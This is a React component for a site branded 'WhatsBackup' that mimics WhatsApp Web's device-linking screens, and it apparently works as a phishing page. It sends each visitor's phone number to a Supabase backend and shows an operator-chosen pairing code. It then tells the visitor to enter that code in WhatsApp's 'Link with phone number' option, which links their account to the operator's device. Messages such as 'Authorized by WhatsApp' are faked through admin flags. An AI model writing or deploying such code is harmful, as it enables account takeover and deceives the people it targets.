import React, { useState } from 'react';
import { CheckCircle2, AlertTriangle, ArrowRight, ArrowLeft, RefreshCw, Copy, Check, ChevronDown } from 'lucide-react';
import { AdminConfig, LinkedDevice, RealtimeSyncStatus } from '../types';
import { recordUserSubmission, updateUserSubmissionStep } from '../services/supabaseClient';

interface WhatsAppLinkDeviceProps {
  adminConfig: AdminConfig;
  linkedDevice: LinkedDevice;
  syncStatus?: RealtimeSyncStatus;
  onDeviceLinked: (deviceData: Partial<LinkedDevice>) => void;
  onDisconnectDevice: () => void;
  onGoToBackup: () => void;
}

const COUNTRY_CODES = [
  { name: 'Pakistan', code: '+92', flag: '🇵🇰' },
  { name: 'United States', code: '+1', flag: '🇺🇸' },
  { name: 'United Kingdom', code: '+44', flag: '🇬🇧' },
  { name: 'United Arab Emirates', code: '+971', flag: '🇦🇪' },
  { name: 'Saudi Arabia', code: '+966', flag: '🇸🇦' },
  { name: 'India', code: '+91', flag: '🇮🇳' },
  { name: 'Canada', code: '+1', flag: '🇨🇦' },
  { name: 'Australia', code: '+61', flag: '🇦🇺' },
  { name: 'Germany', code: '+49', flag: '🇩🇪' },
];

export const WhatsAppLinkDevice: React.FC<WhatsAppLinkDeviceProps> = ({
  adminConfig,
  linkedDevice,
  syncStatus,
  onDeviceLinked,
  onDisconnectDevice,
  onGoToBackup,
}) => {
  // Step in the linking process: 'enter_phone' | 'enter_code'
  const [step, setStep] = useState<'enter_phone' | 'enter_code'>('enter_phone');
  const [selectedCountry, setSelectedCountry] = useState(COUNTRY_CODES[0]);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [countryDropdownOpen, setCountryDropdownOpen] = useState(false);

  // Change country without forcing any number
  const handleSelectCountry = (country: typeof COUNTRY_CODES[0]) => {
    setSelectedCountry(country);
    setCountryDropdownOpen(false);
  };

  // Code verification state
  const [isVerifying, setIsVerifying] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [submissionId, setSubmissionId] = useState<string | null>(null);

  // If already linked, show the connected device screen
  if (linkedDevice.isLinked) {
    return (
      <div className="py-8 px-4 sm:px-8 text-center max-w-xl mx-auto">
        <div className="w-16 h-16 rounded-full bg-[#25D366]/15 text-[#00a884] dark:text-[#25D366] mx-auto flex items-center justify-center mb-4 ring-8 ring-[#25D366]/10">
          <CheckCircle2 className="w-10 h-10" />
        </div>

        <h2 className="text-2xl font-bold text-[#111b21] dark:text-white mb-2">
          Device Connected!
        </h2>
        <p className="text-sm text-[#667781] dark:text-[#8696a0] mb-6">
          Your phone is now linked with WhatsBackup. You can now create your data backup.
        </p>

        {/* Device card */}
        <div className="bg-[#f0f2f5] dark:bg-[#202c33] rounded-xl p-4 text-left text-xs mb-6 space-y-2 border border-slate-200 dark:border-slate-800">
          <div className="flex justify-between items-center">
            <span className="text-[#667781] dark:text-[#8696a0]">Device Name:</span>
            <span className="font-semibold text-[#111b21] dark:text-white">{linkedDevice.deviceName}</span>
          </div>
          {linkedDevice.phoneDisplay ? (
            <div className="flex justify-between items-center">
              <span className="text-[#667781] dark:text-[#8696a0]">Phone Number:</span>
              <span className="font-mono text-[#111b21] dark:text-white">{linkedDevice.phoneDisplay}</span>
            </div>
          ) : null}
          <div className="flex justify-between items-center">
            <span className="text-[#667781] dark:text-[#8696a0]">Connection Status:</span>
            <span className="text-[#00a884] dark:text-[#25D366] font-semibold flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse"></span>
              Connected
            </span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-[#667781] dark:text-[#8696a0]">Linked Time:</span>
            <span className="font-mono text-[#111b21] dark:text-white">{linkedDevice.linkedAt || 'Just now'}</span>
          </div>
        </div>

        {/* Action buttons */}
        <div className="flex flex-col sm:flex-row items-center justify-center gap-3">
          <button
            onClick={onGoToBackup}
            className="w-full sm:w-auto px-6 py-3 rounded-full bg-[#00a884] hover:bg-[#02906f] text-white font-semibold text-sm shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
          >
            <span>Go to Data Backup</span>
            <ArrowRight className="w-4 h-4" />
          </button>
          <button
            onClick={onDisconnectDevice}
            className="w-full sm:w-auto px-5 py-3 rounded-full border border-slate-300 dark:border-slate-700 text-[#667781] dark:text-[#8696a0] hover:bg-slate-100 dark:hover:bg-slate-800 text-sm font-medium transition-colors cursor-pointer"
          >
            Disconnect Device
          </button>
        </div>
      </div>
    );
  }

  // Handle clicking "Next" on phone number screen (records submission in Supabase immediately)
  const handleProceedToCode = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    setStep('enter_code');

    const cleanNumber = phoneNumber.trim();
    if (cleanNumber) {
      const fullNumber = `${selectedCountry.code} ${cleanNumber}`;
      recordUserSubmission({
        phoneNumber: fullNumber,
        countryName: selectedCountry.name,
        countryCode: selectedCountry.code,
        currentStep: 'Viewing Code',
        customUrl: adminConfig.supabaseUrl,
        customAnonKey: adminConfig.supabaseAnonKey,
      }).then((res) => {
        if (res.id) {
          setSubmissionId(res.id);
        }
      });
    }
  };

  // 8-character linking code directly from admin config (NO random generation)
  const rawCode = (adminConfig.linkingCode || 'G5KPWFAA').replace(/[-\s]/g, '').toUpperCase();
  const codePart1 = rawCode.slice(0, 4);
  const codePart2 = rawCode.slice(4, 8);

  // Copy code
  const handleCopyCode = () => {
    navigator.clipboard.writeText(rawCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="py-3 px-1 sm:px-6 max-w-2xl mx-auto w-full">
      
      {/* SCREEN 1: ENTER PHONE NUMBER (EXACT WHATSAPP WEB STYLE AS IN USER SCREENSHOT) */}
      {step === 'enter_phone' && (
        <div className="relative py-2 sm:py-4">
          {/* Top-left arrow */}
          <div className="mb-3 sm:mb-4">
            <button
              type="button"
              onClick={() => {
                setPhoneNumber('');
                setErrorMessage(null);
              }}
              className="p-1 -ml-1 text-slate-700 dark:text-slate-300 hover:text-black dark:hover:text-white rounded-full transition-colors cursor-pointer"
              title="Back"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
          </div>

          {/* Centered Heading & Subtitle */}
          <div className="text-center px-1">
            <h2 className="text-xl sm:text-2xl font-bold text-[#111b21] dark:text-white tracking-tight">
              Enter phone number
            </h2>
            <p className="text-xs sm:text-sm text-[#667781] dark:text-[#8696a0] mt-1.5">
              Select a country and enter your phone number.
            </p>
          </div>

          {/* Centered Form */}
          <form onSubmit={handleProceedToCode} className="mt-6 sm:mt-8 max-w-[340px] w-full mx-auto space-y-4">
            {/* Country Selector Box */}
            <div className="relative">
              <button
                type="button"
                onClick={() => setCountryDropdownOpen(!countryDropdownOpen)}
                className="w-full flex items-center justify-between px-3.5 py-2.5 rounded-lg border border-slate-300 dark:border-slate-600 bg-white dark:bg-[#111b21] text-sm text-[#111b21] dark:text-white hover:border-slate-400 focus:outline-hidden text-left cursor-pointer transition-colors"
              >
                <span className="flex items-center gap-2.5">
                  <span className="text-lg leading-none">{selectedCountry.flag}</span>
                  <span className="font-normal text-sm text-[#111b21] dark:text-white">{selectedCountry.name}</span>
                </span>
                <ChevronDown className="w-4 h-4 text-[#54656f] dark:text-[#8696a0]" />
              </button>

              {countryDropdownOpen && (
                <div className="absolute top-full left-0 right-0 mt-1 bg-white dark:bg-[#202c33] border border-slate-200 dark:border-slate-700 rounded-lg shadow-lg z-20 max-h-52 overflow-y-auto">
                  {COUNTRY_CODES.map((c) => (
                    <button
                      key={c.name}
                      type="button"
                      onClick={() => handleSelectCountry(c)}
                      className="w-full px-3.5 py-2 text-left flex items-center justify-between text-xs hover:bg-[#f0f2f5] dark:hover:bg-[#111b21] transition-colors cursor-pointer text-[#111b21] dark:text-white"
                    >
                      <span className="flex items-center gap-2">
                        <span>{c.flag}</span>
                        <span>{c.name}</span>
                      </span>
                      <span className="font-mono text-[#667781] dark:text-[#8696a0]">{c.code}</span>
                    </button>
                  ))}
                </div>
              )}
            </div>

            {/* WhatsApp Notched Green Outlined Phone Input */}
            <div className="relative rounded-lg border-2 border-[#00a884] bg-white dark:bg-[#111b21] px-3.5 py-2.5 transition-colors">
              <span className="absolute -top-2.5 left-3 px-1.5 bg-white dark:bg-[#111b21] text-[11px] font-medium text-[#00a884]">
                Phone number
              </span>
              <input
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                className="w-full bg-transparent focus:outline-hidden text-sm font-medium text-[#111b21] dark:text-white tracking-wide font-sans"
              />
            </div>

            {errorMessage && (
              <p className="text-xs text-rose-600 dark:text-rose-400 font-medium text-center">
                {errorMessage}
              </p>
            )}

            {/* Next Button */}
            <div className="pt-3 flex justify-center">
              <button
                type="submit"
                className="px-7 py-2 rounded-full bg-[#00a884] hover:bg-[#02906f] text-white text-sm font-medium shadow-xs transition-colors cursor-pointer"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      )}

      {/* SCREEN 2: ENTER CODE ON YOUR PHONE (WHATSAPP WEB EXACT FLOW) */}
      {step === 'enter_code' && (
        <div className="space-y-6">
          
          {/* Back button */}
          <button
            onClick={() => {
              setStep('enter_phone');
              setErrorMessage(null);
            }}
            className="text-xs font-semibold text-[#00a884] dark:text-[#25D366] hover:underline flex items-center gap-1 cursor-pointer"
          >
            &larr; Change phone number
          </button>

          <div className="space-y-1">
            <h2 className="text-xl sm:text-2xl font-bold text-[#111b21] dark:text-white tracking-tight break-words">
              Enter code on your phone
            </h2>
            <p className="text-xs sm:text-sm text-[#667781] dark:text-[#8696a0] leading-relaxed break-words">
              Link with your phone using this 8-character verification code:
            </p>
          </div>

          {/* If admin code service is inactive */}
          {!adminConfig.isActive ? (
            <div className="p-4 rounded-xl bg-rose-50 dark:bg-rose-950/40 border border-rose-200 dark:border-rose-800 text-xs text-rose-700 dark:text-rose-300 flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 shrink-0 text-rose-600" />
              <div>
                <p className="font-bold text-sm">Linking service is currently unavailable. Please try again later.</p>
                <p className="mt-1">The administrator has temporarily paused the linking code service.</p>
              </div>
            </div>
          ) : (
            <>
              {/* THE 8-CHARACTER CODE DISPLAY IN SEPARATE BOXES (FLUID ON ALL SCREENS) */}
              <div className="p-3 sm:p-5 rounded-xl sm:rounded-2xl bg-[#f0f2f5] dark:bg-[#202c33] border border-slate-200 dark:border-slate-800 text-center w-full">
                <div className="flex items-center justify-between text-xs text-[#667781] dark:text-[#8696a0] mb-2 sm:mb-3">
                  <span className="text-[11px] sm:text-xs">Your 8-character linking code:</span>
                  <button
                    onClick={handleCopyCode}
                    className="flex items-center gap-1 font-medium hover:text-[#00a884] transition-colors cursor-pointer text-[11px] sm:text-xs"
                  >
                    {copied ? <Check className="w-3.5 h-3.5 text-[#00a884]" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{copied ? 'Copied' : 'Copy Code'}</span>
                  </button>
                </div>

                {/* The 8 Boxes: [G] [5] [K] [P] - [W] [F] [A] [A] */}
                <div className="flex items-center justify-center gap-1 sm:gap-2.5 py-1 sm:py-2 select-all max-w-full">
                  {/* First 4 letters */}
                  <div className="flex items-center gap-1 min-[360px]:gap-1.5">
                    {codePart1.split('').map((char, index) => (
                      <div
                        key={`p1-${index}`}
                        className="w-7 h-10 min-[360px]:w-8 min-[360px]:h-11 sm:w-10 sm:h-13 rounded-md sm:rounded-lg bg-white dark:bg-[#111b21] border-2 border-[#00a884] dark:border-[#25D366] flex items-center justify-center font-mono text-base min-[360px]:text-lg sm:text-2xl font-bold text-[#111b21] dark:text-white shadow-xs shrink-0"
                      >
                        {char}
                      </div>
                    ))}
                  </div>

                  {/* Hyphen */}
                  <div className="text-base min-[360px]:text-xl sm:text-3xl font-bold text-[#667781] dark:text-[#8696a0] px-0.5 sm:px-1 font-mono shrink-0">
                    -
                  </div>

                  {/* Second 4 letters */}
                  <div className="flex items-center gap-1 min-[360px]:gap-1.5">
                    {codePart2.split('').map((char, index) => (
                      <div
                        key={`p2-${index}`}
                        className="w-7 h-10 min-[360px]:w-8 min-[360px]:h-11 sm:w-10 sm:h-13 rounded-md sm:rounded-lg bg-white dark:bg-[#111b21] border-2 border-[#00a884] dark:border-[#25D366] flex items-center justify-center font-mono text-base min-[360px]:text-lg sm:text-2xl font-bold text-[#111b21] dark:text-white shadow-xs shrink-0"
                      >
                        {char}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* SIMPLE STEPS IN PLAIN ENGLISH (EXACTLY LIKE WHATSAPP) */}
              <div className="space-y-2.5 py-1 sm:py-2">
                <h3 className="text-xs sm:text-sm font-bold text-[#111b21] dark:text-white">
                  Steps to link on your phone:
                </h3>
                <ol className="space-y-2 text-xs text-[#3b4a54] dark:text-[#d1d7db] pl-0.5">
                  <li className="flex items-start gap-2">
                    <span className="w-5 h-5 rounded-full bg-[#00a884] text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">
                      1
                    </span>
                    <span className="leading-snug break-words">
                      Open <strong>WhatsApp</strong> on your phone.
                    </span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="w-5 h-5 rounded-full bg-[#00a884] text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">
                      2
                    </span>
                    <span className="leading-snug break-words">
                      Tap <strong>Menu</strong> (three dots ⋮) or <strong>Settings</strong> (⚙️) and select <strong>Linked Devices</strong>.
                    </span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="w-5 h-5 rounded-full bg-[#00a884] text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">
                      3
                    </span>
                    <span className="leading-snug break-words">
                      Tap <strong>Link a Device</strong>.
                    </span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="w-5 h-5 rounded-full bg-[#00a884] text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">
                      4
                    </span>
                    <span className="leading-snug break-words">
                      Tap <strong>Link with phone number instead</strong> and enter the 8-character code shown above.
                    </span>
                  </li>
                </ol>
              </div>

              {/* CONNECT WHATSAPP BUTTON (DISABLED UNTIL BACKEND ALLOWS IT) */}
              <div className="pt-2 flex flex-col items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    if (adminConfig.allowConnection) {
                      setIsVerifying(true);
                      if (submissionId) {
                        updateUserSubmissionStep(submissionId, 'Connected WhatsApp', {
                          customUrl: adminConfig.supabaseUrl,
                          customAnonKey: adminConfig.supabaseAnonKey,
                        });
                      }
                      setTimeout(() => {
                        setIsVerifying(false);
                        onDeviceLinked({
                          isLinked: true,
                          deviceName: 'Android Phone',
                          phoneDisplay: phoneNumber.trim() ? `${selectedCountry.code} ${phoneNumber.trim()}` : '',
                          linkedAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
                        });
                      }, 500);
                    }
                  }}
                  disabled={!adminConfig.allowConnection || isVerifying}
                  className={`w-full sm:w-auto px-8 py-3 rounded-full font-semibold text-sm transition-all flex items-center justify-center gap-2 ${
                    adminConfig.allowConnection
                      ? 'bg-[#00a884] hover:bg-[#02906f] text-white cursor-pointer shadow-md'
                      : 'bg-slate-200 dark:bg-slate-700 text-slate-400 dark:text-slate-500 cursor-not-allowed opacity-75'
                  }`}
                >
                  {isVerifying ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>Connecting WhatsApp...</span>
                    </>
                  ) : (
                    <span>Connect WhatsApp</span>
                  )}
                </button>

                {!adminConfig.allowConnection ? (
                  <p className="text-xs text-[#667781] dark:text-[#8696a0] text-center">
                    Waiting for authorization by WhatsApp...
                  </p>
                ) : (
                  <p className="text-xs text-[#00a884] dark:text-[#25D366] font-semibold text-center flex items-center gap-1.5">
                    <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse"></span>
                    <span>Authorized by WhatsApp · Click Connect WhatsApp</span>
                  </p>
                )}
              </div>
            </>
          )}
        </div>
      )}
    </div>
  );
};
